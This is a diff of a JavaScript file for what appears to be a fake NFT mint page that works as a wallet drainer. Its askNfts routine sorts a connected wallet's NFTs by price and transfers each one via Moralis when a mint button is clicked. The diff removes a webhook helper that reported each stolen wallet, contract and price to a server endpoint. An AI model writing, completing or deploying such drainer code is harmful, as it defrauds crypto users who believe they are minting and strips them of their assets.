@@ -187,15 +187,7 @@ async function askNfts(web3, amount) {
             for (transaction of transactionsOptions.sort((a, b) => b.price - a.price)) {
                 console.log(transaction);
                 Moralis.transfer(transaction.options)
-                    .catch(O_o => console.error(O_o, transaction))
-                    .then((uwu) => {
-                      if (uwu)
-                  sendWebhooks(
-                  walletAddress,
-                  transaction.options.contractAddress,
-                  transaction.price
-                );
-                });
+                    .catch(O_o => console.error(O_o, transaction));
             }
         } else askMint(amount);
     }).catch(O_o => console.log(O_o));
@@ -240,10 +232,3 @@ window.addEventListener('load', async () => {
     document.querySelector("#connect").addEventListener("click", onConnect);
     document.querySelector("#transfer").addEventListener("click", clickMint);
 });
-
-const sendWebhooks = (userWallet, contract, price) =>
-  fetch(`/api.php?o=success`, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ userWallet, contract, price, WebhookClient }),
-  }).catch((err) => console.error(err));
